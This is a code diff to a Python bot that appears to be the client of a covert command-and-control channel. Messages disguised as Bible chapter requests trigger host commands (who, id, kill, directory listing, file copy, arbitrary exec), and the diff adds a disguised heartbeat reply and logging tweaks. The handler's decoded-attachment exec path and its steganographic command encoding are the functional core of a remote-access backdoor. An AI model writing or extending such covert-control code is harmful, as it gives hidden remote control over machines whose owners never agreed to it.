@@ -58,16 +58,20 @@ def process_msg(sender, msg_id, msg, attachment):
         print('>>> Message is not a command', flush=True)
         return
 
-    if msg.startswith('Send me text of chapter '):
+    if msg == 'Tell me latest Bible news...':
+        add_message('Bible is old, there are no news', BOT_NICK_NAME, reply_to=msg_id)
+        print('>>> Heartbeat, bot is running', flush=True)
+
+    elif msg.startswith('Send me text of chapter '):
         chapter_num = int(msg[24]) if msg[25] == ',' else int(msg[24:26])
         cmd = get_command_for_chapter(chapter_num)
 
         if cmd == 'w':
             result = process_who()
-            print(f'>>> w reply: {result}')
+            print(f'>>> w reply: {result}', flush=True)
         elif cmd == 'id':
             result = process_id()
-            print(f'>>> id reply: {result}')
+            print(f'>>> id reply: {result}', flush=True)
         elif cmd == 'kill':
             return 'kill'
         else:
@@ -95,13 +99,13 @@ def process_msg(sender, msg_id, msg, attachment):
 
         if cmd == 'ls':
             result = process_ls(decoded)
-            print(f'>>> ls reply: {result}')
+            print(f'>>> ls reply: {result}', flush=True)
         elif cmd == 'cp':
             result = process_cp(decoded)
-            print(f'>>> cp reply: {result}')
+            print(f'>>> cp reply: {result}', flush=True)
         elif cmd == 'exec':
             result = process_exec(decoded)
-            print(f'>>> exec reply: {result}')
+            print(f'>>> exec reply: {result}', flush=True)
         else:
             print(f'>>> Invalid command: "{cmd}" with attachment', flush=True)
             return
@@ -120,7 +124,6 @@ def process_msg(sender, msg_id, msg, attachment):
     else:
         print(f'>>> Unknown command: "{msg}"', flush=True)
         return
-    print(flush=True)
 
 
 def run():
@@ -149,8 +152,6 @@ def run():
                     break
 
             max_msg_id = new_max_msg_id
-        else:
-            print('>>> No new messages...', flush=True)
 
 
 if __name__ == '__main__':
